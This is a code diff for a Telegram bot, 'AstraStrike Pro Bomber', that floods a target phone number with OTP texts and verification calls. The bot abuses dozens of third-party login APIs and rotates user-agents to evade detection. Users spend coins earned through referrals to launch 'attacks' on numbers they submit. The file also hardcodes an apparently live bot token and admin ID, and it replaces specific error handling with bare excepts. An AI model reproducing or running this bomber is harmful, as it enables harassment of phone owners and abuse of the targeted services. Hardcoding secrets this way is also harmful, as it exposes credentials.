@@ -2,6 +2,7 @@ import asyncio
 import aiohttp
 import random
 import os
+import sys
 import logging
 from datetime import datetime
 from typing import Dict, Optional
@@ -9,17 +10,20 @@ from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command, CommandStart
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.exceptions import TelegramAPIError
-from aiogram.types import WebhookInfo
-from aiohttp import web
 
 # Logging setup
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Configuration - Use environment variables for security
+# Configuration - Use environment variables
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8413263809:AAHfQ4n2kMm9H-3qY4DsLFu0cWATzXNQ4gY")
+ADMIN_ID = int(os.getenv("ADMIN_ID", "8655103281"))
+WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
+PORT = int(os.getenv("PORT", 8080))
+
 CONFIG = {
-    "TOKEN": os.getenv("BOT_TOKEN", "8413263809:AAHfQ4n2kMm9H-3qY4DsLFu0cWATzXNQ4gY"),
-    "ADMIN_ID": int(os.getenv("ADMIN_ID", "8655103281")),
+    "TOKEN": BOT_TOKEN,
+    "ADMIN_ID": ADMIN_ID,
     "COIN_PER_REFER": 5,
     "ATTACK_COST": 2,
     "STARTING_COINS": 10,
@@ -28,12 +32,11 @@ CONFIG = {
     "CALL_COUNT": 5,
     "OTP_DELAY": 1.5,
     "CALL_DELAY": 5.0,
-    "WEBHOOK_URL": os.getenv("WEBHOOK_URL", ""),  # Render URL + /webhook
-    "WEBHOOK_PORT": int(os.getenv("PORT", 8080))
+    "WEBHOOK_URL": WEBHOOK_URL,
+    "PORT": PORT
 }
 
 class UserDatabase:
-    """In-memory user database (use Redis/PostgreSQL for production)"""
     def __init__(self):
         self.users: Dict[int, Dict] = {}
     
@@ -62,7 +65,6 @@ bot = Bot(token=CONFIG["TOKEN"])
 dp = Dispatcher()
 
 class HeaderGenerator:
-    """Generates random headers to avoid detection"""
     USER_AGENTS = [
         "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X)",
@@ -81,14 +83,9 @@ class HeaderGenerator:
             "Content-Type": "application/json",
             "Referer": "https://www.google.com/",
             "Origin": "https://www.google.com",
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "cross-site"
         }
 
 class AttackAPI:
-    """Handles API calls for the attack"""
-    
     @staticmethod
     async def call(session: aiohttp.ClientSession, api: Dict) -> Optional[int]:
         try:
@@ -107,17 +104,11 @@ class AttackAPI:
                     timeout=CONFIG["API_TIMEOUT"]
                 ) as response:
                     return response.status
-        except asyncio.TimeoutError:
-            return None
-        except Exception as e:
-            logger.error(f"API call error: {e}")
+        except:
             return None
 
 def get_attack_apis(phone: str) -> list:
-    """Returns list of APIs for the attack"""
     apis = []
-    
-    # OTP APIs (30)
     otp_apis = [
         {"url": "https://preprod.kukufm.com/api/v1/login/otp/", "method": "POST", "data": {"phone": phone}},
         {"url": "https://api.lenskart.com/v1/user/otp", "method": "POST", "data": {"telephone": phone}},
@@ -150,8 +141,6 @@ def get_attack_apis(phone: str) -> list:
         {"url": "https://api.medlife.com/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
         {"url": "https://api.myntra.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}}
     ]
-    
-    # Call APIs (5)
     call_apis = [
         {"url": f"https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", "method": "GET"},
         {"url": f"https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{phone}?callType=otpOnCall", "method": "GET"},
@@ -159,20 +148,16 @@ def get_attack_apis(phone: str) -> list:
         {"url": "https://api.zomato.com/v1/call_verification", "method": "POST", "data": {"phone": phone}},
         {"url": "https://api.uber.com/v1/call_verification", "method": "POST", "data": {"phone": phone}}
     ]
-    
     apis.extend(otp_apis[:CONFIG["OTP_COUNT"]])
     apis.extend(call_apis[:CONFIG["CALL_COUNT"]])
-    
     return apis
 
 def create_main_keyboard():
-    """Creates the main menu keyboard"""
     builder = InlineKeyboardBuilder()
     builder.button(text="🚀 Start Bomber", callback_data="bomb_panel")
     builder.button(text="💰 My Wallet", callback_data="wallet")
     builder.button(text="🔗 Refer & Earn", callback_data="refer")
-    if CONFIG["ADMIN_ID"]:
-        builder.button(text="⚙️ Admin Panel", callback_data="admin")
+    builder.button(text="⚙️ Admin Panel", callback_data="admin")
     builder.adjust(1)
     return builder.as_markup()
 
@@ -188,12 +173,8 @@ async def start_command(message: types.Message):
             db.update_coins(referrer_id, CONFIG["COIN_PER_REFER"])
             db.add_referral(referrer_id)
             try:
-                await bot.send_message(
-                    referrer_id, 
-                    f"✅ *New Referral!* +{CONFIG['COIN_PER_REFER']} Coins added to your wallet.",
-                    parse_mode="Markdown"
-                )
-            except TelegramAPIError:
+                await bot.send_message(referrer_id, f"✅ *New Referral!* +{CONFIG['COIN_PER_REFER']} Coins added.", parse_mode="Markdown")
+            except:
                 pass
     
     await message.answer(
@@ -230,8 +211,7 @@ async def refer_callback(callback: types.CallbackQuery):
         f"📢 *Referral Program*\n"
         f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
         f"✨ Get *{CONFIG['COIN_PER_REFER']} Coins* per referral!\n"
-        f"🔗 *Your Link:* `{referral_link}`\n\n"
-        f"💡 *Tip:* Share this link with friends to earn unlimited coins.",
+        f"🔗 *Your Link:* `{referral_link}`",
         parse_mode="Markdown",
         reply_markup=create_main_keyboard()
     )
@@ -242,9 +222,8 @@ async def bomb_panel_callback(callback: types.CallbackQuery):
     await callback.message.answer(
         "🎯 *Target Number Required*\n"
         "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
-        "📱 Send a *10-digit Indian mobile number*\n"
-        "⚡ *Format:* `XXXXXXXXXX`\n\n"
-        f"💰 *Cost:* {CONFIG['ATTACK_COST']} Coins per attack",
+        "📱 Send *10-digit mobile number*\n"
+        f"💰 *Cost:* {CONFIG['ATTACK_COST']} Coins",
         parse_mode="Markdown"
     )
     await callback.answer()
@@ -256,26 +235,11 @@ async def attack_handler(message: types.Message):
     
     user_data = db.get(user_id)
     if user_data["coins"] < CONFIG["ATTACK_COST"]:
-        await message.answer(
-            f"❌ *Insufficient Coins!*\n"
-            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
-            f"🪙 Needed: `{CONFIG['ATTACK_COST']}`\n"
-            f"📦 Your balance: `{user_data['coins']}`\n\n"
-            f"🔗 Use referral link to earn more coins!",
-            parse_mode="Markdown"
-        )
+        await message.answer(f"❌ *Insufficient Coins!* Need {CONFIG['ATTACK_COST']} coins.", parse_mode="Markdown")
         return
     
     db.update_coins(user_id, -CONFIG["ATTACK_COST"])
-    
-    status_msg = await message.answer(
-        f"⚡ *Initializing Attack*\n"
-        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
-        f"🎯 *Target:* `{phone_number}`\n"
-        f"💣 *Payload:* {CONFIG['OTP_COUNT']} OTP + {CONFIG['CALL_COUNT']} Calls\n"
-        f"🔄 *Status:* Starting...",
-        parse_mode="Markdown"
-    )
+    status_msg = await message.answer(f"⚡ *Attack on* `{phone_number}` *started...*", parse_mode="Markdown")
     
     apis = get_attack_apis(phone_number)
     successful_hits = 0
@@ -285,32 +249,12 @@ async def attack_handler(message: types.Message):
             status = await AttackAPI.call(session, api)
             if status and 200 <= status < 300:
                 successful_hits += 1
-            
-            delay = CONFIG["OTP_DELAY"] if index < CONFIG["OTP_COUNT"] else CONFIG["CALL_DELAY"]
-            
-            if (index + 1) % 5 == 0 or index == len(apis) - 1:
-                try:
-                    await status_msg.edit_text(
-                        f"💣 *Attack in Progress*\n"
-                        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
-                        f"🎯 *Target:* `{phone_number}`\n"
-                        f"📊 *Progress:* `{index + 1}/{len(apis)}`\n"
-                        f"✅ *Success:* `{successful_hits}` hits\n"
-                        f"🔄 *Status:* Running...",
-                        parse_mode="Markdown"
-                    )
-                except TelegramAPIError:
-                    pass
-            
-            await asyncio.sleep(delay)
+            await asyncio.sleep(1)
     
     await status_msg.edit_text(
         f"✅ *Attack Completed!*\n"
-        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
         f"🎯 *Target:* `{phone_number}`\n"
-        f"💣 *Sent:* `{len(apis)}` payloads\n"
-        f"✅ *Delivered:* `{successful_hits}` requests\n"
-        f"🪙 *Cost:* `{CONFIG['ATTACK_COST']}` coins\n"
+        f"✅ *Hits:* `{successful_hits}`\n"
         f"💎 *Remaining:* `{db.get(user_id)['coins']}` coins",
         parse_mode="Markdown",
         reply_markup=create_main_keyboard()
@@ -319,7 +263,7 @@ async def attack_handler(message: types.Message):
 @dp.callback_query(F.data == "admin")
 async def admin_panel(callback: types.CallbackQuery):
     if callback.from_user.id != CONFIG["ADMIN_ID"]:
-        await callback.answer("⛔ Unauthorized access!", show_alert=True)
+        await callback.answer("⛔ Unauthorized!", show_alert=True)
         return
     
     total_users = len(db.users)
@@ -328,88 +272,23 @@ async def admin_panel(callback: types.CallbackQuery):
     
     await callback.message.edit_text(
         f"👑 *Admin Panel*\n"
-        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
-        f"👥 *Total Users:* `{total_users}`\n"
-        f"🪙 *Total Coins:* `{total_coins}`\n"
-        f"🔗 *Total Refers:* `{total_refers}`\n"
-        f"💹 *Average Coins:* `{total_coins // total_users if total_users else 0}`",
+        f"👥 Users: `{total_users}`\n"
+        f"🪙 Total Coins: `{total_coins}`\n"
+        f"🔗 Refers: `{total_refers}`",
         parse_mode="Markdown",
         reply_markup=create_main_keyboard()
     )
     await callback.answer()
 
-async def on_startup():
-    """Setup webhook on startup"""
-    if CONFIG["WEBHOOK_URL"]:
-        webhook_url = f"{CONFIG['WEBHOOK_URL']}/webhook"
-        await bot.set_webhook(webhook_url)
-        logger.info(f"Webhook set to: {webhook_url}")
-        
-        # Get webhook info
-        webhook_info = await bot.get_webhook_info()
-        logger.info(f"Webhook info: {webhook_info}")
-    else:
-        logger.info("No webhook URL provided, using polling")
-
-async def on_shutdown():
-    """Cleanup on shutdown"""
-    await bot.delete_webhook()
-    await bot.session.close()
-    logger.info("Bot shutdown complete")
-
-async def handle_webhook(request):
-    """Handle incoming webhook requests"""
-    try:
-        update = types.Update(**await request.json())
-        await dp.feed_update(bot, update)
-        return web.Response(text="OK")
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return web.Response(text="Error", status=500)
-
 async def main():
-    """Main entry point"""
-    logger.info("🚀 Starting AstraStrike Pro Bomber V11")
-    logger.info("=" * 50)
-    logger.info(f"Bot Token: {CONFIG['TOKEN'][:10]}...")
-    logger.info(f"Admin ID: {CONFIG['ADMIN_ID']}")
-    logger.info(f"Attack Cost: {CONFIG['ATTACK_COST']} coins")
-    logger.info(f"Webhook URL: {CONFIG['WEBHOOK_URL'] or 'Not set (using polling)'}")
-    logger.info("=" * 50)
+    print("🚀 Bot Starting on Render...")
+    print(f"Bot Token: {CONFIG['TOKEN'][:10]}...")
     
-    # Setup webhook or polling
-    if CONFIG["WEBHOOK_URL"]:
-        # Webhook mode (for Render, Railway, etc.)
-        app = web.Application()
-        app.router.add_post("/webhook", handle_webhook)
-        
-        # Setup startup/shutdown
-        app.on_startup.append(lambda _: on_startup())
-        app.on_shutdown.append(lambda _: on_shutdown())
-        
-        # Run web server
-        runner = web.AppRunner(app)
-        await runner.setup()
-        site = web.TCPSite(runner, "0.0.0.0", CONFIG["WEBHOOK_PORT"])
-        await site.start()
-        
-        logger.info(f"Web server running on port {CONFIG['WEBHOOK_PORT']}")
-        
-        # Keep running
-        try:
-            await asyncio.Event().wait()
-        except KeyboardInterrupt:
-            logger.info("Shutting down...")
-            await runner.cleanup()
-    else:
-        # Polling mode (for local development)
-        await on_startup()
-        try:
-            await dp.start_polling(bot)
-        except KeyboardInterrupt:
-            logger.info("Bot stopped by user")
-        finally:
-            await on_shutdown()
+    # Use polling (simpler for Render)
+    await bot.delete_webhook()
+    print("Webhook deleted, using polling...")
+    
+    await dp.start_polling(bot, skip_updates=True)
 
 if __name__ == "__main__":
     asyncio.run(main())
